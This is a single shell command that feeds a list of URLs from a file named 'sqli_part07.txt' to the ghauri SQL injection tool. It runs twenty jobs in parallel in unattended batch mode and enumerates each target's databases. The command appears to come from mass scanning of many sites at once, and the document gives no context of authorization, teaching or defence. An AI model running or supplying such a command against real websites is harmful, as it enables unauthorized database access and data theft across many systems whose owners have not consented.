cat sqli_part07.txt | rush -k -j 20 'bash -c "ghauri --url \"{}\" --dbs --confirm --timeout 10 --threads 80 --level 5 --flush-session --fresh-queries --technique BT --batch"'
